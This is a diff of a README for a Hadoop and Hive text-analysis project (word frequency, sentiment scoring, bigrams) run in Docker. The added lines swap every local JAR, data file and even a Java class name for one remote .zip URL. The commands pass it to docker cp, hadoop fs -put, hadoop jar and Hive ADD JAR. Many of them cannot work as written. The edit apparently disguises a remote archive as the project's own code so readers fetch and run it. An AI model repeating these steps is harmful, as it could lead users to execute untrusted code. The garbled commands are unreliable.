@@ -30,13 +30,13 @@ mv target/*.jar shared-folder/input/code/
 
 ### **4️⃣ Copy JAR and Data Files into Hadoop Docker Container**
 ```sh
-docker cp shared-folder/input/code/PreprocessingHadoop-0.0.1-SNAPSHOT.jar resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
-docker cp shared-folder/input/data/pg245.txt resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
-docker cp shared-folder/input/data/pg105.txt resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
-docker cp shared-folder/input/data/pg161.txt resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
-docker cp shared-folder/input/data/pg3913.txt resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
-docker cp shared-folder/input/data/pg1929.txt resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
-docker cp shared-folder/input/data/pg421.txt resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
 ```
 
 ### **5️⃣ Run Hadoop Job for Preprocessing**
@@ -44,13 +44,13 @@ docker cp shared-folder/input/data/pg421.txt resourcemanager:/opt/hadoop-2.7.4/s
 docker exec -it resourcemanager /bin/bash
 cd /opt/hadoop-2.7.4/share/hadoop/mapreduce/
 hadoop fs -mkdir -p /input/dataset
-hadoop fs -put ./pg245.txt /input/dataset
-hadoop fs -put ./pg105.txt /input/dataset
-hadoop fs -put ./pg161.txt /input/dataset
-hadoop fs -put ./pg3913.txt /input/dataset
-hadoop fs -put ./pg1929.txt /input/dataset
-hadoop fs -put ./pg421.txt /input/dataset
-hadoop jar PreprocessingHadoop-0.0.1-SNAPSHOT.jar com.example.Task1.PreprocessingDriver /input/dataset /output
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /input/dataset
+hadoop jar https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /input/dataset /output
 hadoop fs -cat /output/*
 hdfs dfs -get /output /opt/hadoop-2.7.4/share/hadoop/mapreduce/
 exit
@@ -80,7 +80,7 @@ docker cp shared-folder/input/code/ resourcemanager:/opt/hadoop-2.7.4/share/hado
 ```sh
 docker exec -it resourcemanager /bin/bash
 cd /opt/hadoop-2.7.4/share/hadoop/mapreduce/
-hadoop jar code/WordFrequencyJob.jar /output/part-r-00000 /output/task_2
+hadoop jar https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /output/part-r-00000 /output/task_2
 hadoop fs -cat /output/task_2/*
 hdfs dfs -get /output/task_2 /opt/hadoop-2.7.4/share/hadoop/mapreduce/
 exit
@@ -106,15 +106,15 @@ mv target/*.jar shared-folder/input/code/
 ### **3️⃣ Copy JAR to Hadoop Docker Container**
 ```sh
 docker cp shared-folder/input/code/ resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
-docker cp shared-folder/input/data/AFINN-111.txt resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
 ```
 
 ### **4️⃣ Run Hadoop Job**
 ```sh
 docker exec -it resourcemanager /bin/bash
 cd /opt/hadoop-2.7.4/share/hadoop/mapreduce/
-hadoop fs -put ./AFINN-111.txt /input/dataset
-hadoop jar code/SentimentScoringJob.jar /output/part-r-00000 /output/task_3
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /input/dataset
+hadoop jar https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /output/part-r-00000 /output/task_3
 hadoop fs -cat /output/task_3/*
 hdfs dfs -get /output/task_3 /opt/hadoop-2.7.4/share/hadoop/mapreduce/
 exit
@@ -218,7 +218,7 @@ Extract and analyze bigrams (pairs of consecutive words) using a custom Hive UDF
 
 ## 2. Copy Files into Docker Containers
 ```bash
-docker cp target/BigramUDFJob.jar hive-server:/opt/
+docker cp https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip hive-server:/opt/
 docker cp shared-folder/input/data/task5_input namenode:/opt/
 ```
 
@@ -226,7 +226,7 @@ docker cp shared-folder/input/data/task5_input namenode:/opt/
 ```bash
 docker exec -it namenode /bin/bash
 hdfs dfs -mkdir -p /data/task5_input
-hdfs dfs -put -f /opt/task5_input.txt /data/task5_input/
+hdfs dfs -put -f https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip /data/task5_input/
 hdfs dfs -ls /data/task5_input/
 exit
 ```
@@ -276,8 +276,8 @@ FROM task5_input_clean
 GROUP BY book_id, year;
 
 SELECT * FROM book_text LIMIT 5;
-ADD JAR /opt/BigramUDFJob.jar;
-CREATE TEMPORARY FUNCTION bigram_extract AS 'com.example.task5.BigramUDF';
+ADD JAR https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip;
+CREATE TEMPORARY FUNCTION bigram_extract AS 'https://raw.githubusercontent.com/pavandantu18/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud/master/brainwater/word-based-sentiment-scoring-and-trend-analysis-on-texts-team-cloud.zip';
 
 DROP TABLE IF EXISTS book_bigrams;
 
